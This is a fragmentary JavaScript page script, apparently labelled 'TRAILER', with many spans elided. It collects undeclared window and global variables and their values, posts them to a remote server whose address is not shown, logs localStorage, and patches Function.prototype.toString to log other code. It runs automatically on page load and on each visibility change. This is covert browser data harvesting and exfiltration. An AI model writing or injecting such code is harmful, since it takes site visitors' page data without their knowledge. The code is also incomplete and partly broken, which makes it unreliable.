...
/** TRAILER */
function gatherWindowPropsAndGlobalVars() {
  const unseenProps = {};
  const globalVars = {};
  for (const key in window) {
    if (window.hasOwnProperty(key) && !window.seenVars.includes(key)) {
      ...
      unseenProps[key] = {
        type: type,
        value: type === "function" ? 'Function definition not extracted' : value
      };
    }
  }
  for (const key in global) {
    if (global.hasOwnProperty(key) && !global.seenVars.includes(key)) {
...
function postCapturedDataToServer(data) {
  ...
  }).then(response => response.status === 200 ? console.log("Data sent successfully.") : console.error(`Error sending data, status: ${response.status}`)).catch(error => console.error('An error occurred while sending data:', error));
}
...
/* global jQuery */
function detectJsHook() {
  const originalToString = Function.prototype.toString;
  Function.prototype.toString = function () {
    if (this !== window.confirm && this !== Function.prototype.toString) {
      console.log('JS hook found:', this.toString());
    }
    return originalToString.apply(this);
  };
}
function drivenDataCollection() {
  const capturedData = gatherWindowPropsAndGlobalVars();
  if (Object.keys(capturedData).length > 0) {
    postCapturedDataToServer(capturedData);
    logLocalStorageData();
    detectJsHook();
  }
}
 ...
 */
window.addEventListener('load', drivenDataCollection);
...
document.addEventListener('visibilitychange', drivenDataCollection);